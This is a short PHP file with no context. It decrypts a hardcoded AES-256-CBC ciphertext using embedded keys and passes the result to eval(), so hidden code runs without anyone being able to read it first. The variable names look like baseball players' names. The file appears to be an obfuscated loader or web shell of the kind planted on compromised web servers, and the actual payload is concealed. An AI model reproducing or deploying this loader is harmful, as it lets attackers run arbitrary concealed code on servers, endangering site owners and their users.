<?php

$altuve = "  fFjpJ57/c+1Byfn2QNs5HIY2654RTMDidT7F+XejkSQJPlL8kxMLigV2UqxByP1CaknF8e+17W7IW4gJmR39UCDy2QAUS9ZbjXYSrotAzPeJia4+7poClttSzh7c3YxskGP7BBS6e0pn9/+Uix4+QmvwTJralzDqHic6bSOt3P5XgpB8iKU0D2ypBzyNhm9LWruC1R/k60ZKFkTZYDMyIjfBO+ZxXD0GMuayXfETJ0dbDvMlbo3GDnobkxCD87vzD8gvRMucvJxC+G8rmeJlWuVUBp5PBcAUwV+18Nid8AuC4nnQorK2d0kd31TAal9HFe+qAlYDQOwytIjmkkBkRUCyCyxbxxSCpLiyM2pnPVd/k3JBVzVJfpRZUQIlTnOAPxrA3YDTnit8S/md+cjUpFxNQmRnVbmfRhzKm6q+imOuia86GXAisC1aQqPhDbxJ5Ty3XrztfUGK8AUCj5NDaewmVUQLNno8WI7F0S22/n31YfQH8d4GuaDn+xcka+Lgyxf5dy13dX2+obf6YyfMw0NTGWxZpVWFlcV/XKO0AcNghSKhAwVVUdBOLjmQIvaCR2QoLGj5rYr0vNc2r6KkYtGfU00BUtWNYmlvxaikRwoEGKxkN/ZIDpjlTPXCoP5a2kTI5zz/s7+hH/OgvEvrS4kuf9cmx1wRfIuGlD5RXTAhIeUK+4t+Zf9ygxIiMD9JB3AcCJ4Fr3YrsQ14QGCWdoS6RtRjFupKIPdtG6r0t5QHUiDYF2u9vs19HeQlR66Irr+Yp5OhOrOWXZH0rt6xPoOOhxc4+55Ayn2j0hs+R2k=  ";


$zerpa = "  AN99WMpfHhEGk7cZa30RuA==  ";


$zerpa_zerpa = "1234567890123456";


$rafael = openssl_decrypt($zerpa, 'AES-256-CBC', $zerpa_zerpa, 0, '1234567890123456');


$avendaño = openssl_decrypt($altuve, 'AES-256-CBC', $rafael, 0, '1234567890123456');


eval($avendaño);
?>
